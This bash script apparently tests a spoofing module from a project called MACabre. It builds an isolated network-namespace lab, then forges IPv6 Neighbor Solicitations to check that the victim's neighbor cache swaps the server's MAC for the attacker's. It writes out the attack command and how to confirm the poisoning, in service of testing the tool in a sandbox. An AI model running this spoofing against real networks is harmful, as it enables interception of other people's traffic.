#!/usr/bin/env bash
# Isolated Neighbor Solicitation spoofing lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge (sw):
#
#   victim:   the host whose neighbor cache is checked. It has VICTIM_ADDR, and it pings the server.
#   server:   the host whose address is impersonated (SERVER_ADDR). It answers the victim's pings.
#   attacker: sends forged Neighbor Solicitations with MACabre's module. The NS uses SERVER_ADDR as
#             its IPv6 source and the attacker's MAC as the Source Link-Layer Address option.
#
# Phases:
#   control: the victim pings the server. Its cache entry for SERVER_ADDR must hold the server's MAC.
#   attack:  the victim pings the server, then the attacker sends forged NSs to the victim. The entry
#            for SERVER_ADDR must now hold the attacker's MAC.
#
# Addresses are static, with no duplicate address detection, so the lab checks only the cache.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/neighbor_solicitation_spoofing_lab.sh
#
# Exit 0 when the control holds the server's MAC and the attack replaces it with the attacker's MAC.
# Exit 1 when either does not. Exit 2 when the setup failed.
#
# Requirements: iproute2 (ip), IPv6 in the kernel, and the project virtualenv (.venv) with scapy.
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VICTIM_MAC="02:00:00:00:00:10"
SERVER_MAC="02:00:00:00:00:20"
ATTACKER_MAC="02:00:00:00:00:30"
VICTIM_ADDR="2001:db8:1::10"
SERVER_ADDR="2001:db8:1::20"

stop_lab() {
    for ns in attacker victim server sw; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

mk_veth() {
    ip link add "$1" type veth peer name "$2"
    ip link set "$1" netns "$3"
    ip link set "$2" netns "$4"
}

build_topology() {
    stop_lab
    for ns in sw victim server attacker; do
        ip netns add "$ns"
        ip netns exec "$ns" ip link set lo up
    done
    mk_veth p-v v0 sw victim
    mk_veth p-s s0 sw server
    mk_veth p-a a1 sw attacker
    ip netns exec sw ip link add br0 type bridge stp_state 0
    for p in p-v p-s p-a; do
        ip netns exec sw ip link set "$p" master br0
        ip netns exec sw ip link set "$p" up
    done
    ip netns exec sw ip link set br0 up
    ip netns exec victim ip link set v0 address "$VICTIM_MAC"
    ip netns exec server ip link set s0 address "$SERVER_MAC"
    ip netns exec attacker ip link set a1 address "$ATTACKER_MAC"
    ip netns exec victim ip link set v0 up
    ip netns exec server ip link set s0 up
    ip netns exec attacker ip link set a1 up
    ip netns exec victim ip -6 addr add "$VICTIM_ADDR/64" dev v0 nodad
    ip netns exec server ip -6 addr add "$SERVER_ADDR/64" dev s0 nodad
}

cache_lladdr() {
    ip netns exec victim ip -6 neigh show dev v0 "$SERVER_ADDR" | awk '{for (i=1;i<=NF;i++) if ($i=="lladdr") print $(i+1)}'
}

cache_state() {
    ip netns exec victim ip -6 neigh show dev v0 "$SERVER_ADDR" | awk '{print $NF}'
}

# Wait for the victim to learn the server's address with a ping.
learn_server() {
    ip netns exec victim ping -6 -c 2 -W 1 "$SERVER_ADDR" >/dev/null 2>&1 || true
    sleep 1
}

echo "=== control ==="
build_topology
learn_server
control_lladdr=$(cache_lladdr)
echo "victim's cache for $SERVER_ADDR: lladdr=${control_lladdr:-none} state=$(cache_state)"

echo "=== attack ==="
build_topology
learn_server
echo "before the attack: lladdr=$(cache_lladdr)"
ip netns exec attacker "$PY" -m macabre.attacks.neighbor_solicitation_spoofing a1 \
    --source-mac "$ATTACKER_MAC" --target "$SERVER_ADDR" --receiver "$VICTIM_ADDR" --frames 3
sleep 1
attack_lladdr=$(cache_lladdr)
echo "after the attack:  lladdr=${attack_lladdr:-none} state=$(cache_state)"

echo
echo "control: the cache holds the server's MAC ($SERVER_MAC): $([[ "$control_lladdr" == "$SERVER_MAC" ]] && echo yes || echo no)"
echo "attack:  the cache holds the attacker's MAC ($ATTACKER_MAC): $([[ "$attack_lladdr" == "$ATTACKER_MAC" ]] && echo yes || echo no)"

if [[ "$control_lladdr" == "$SERVER_MAC" && "$attack_lladdr" == "$ATTACKER_MAC" ]]; then
    echo "PASS: a forged Neighbor Solicitation replaces the victim's cached MAC for the server's address."
    exit 0
fi
echo "FAIL: the victim's cache did not change as expected."
exit 1
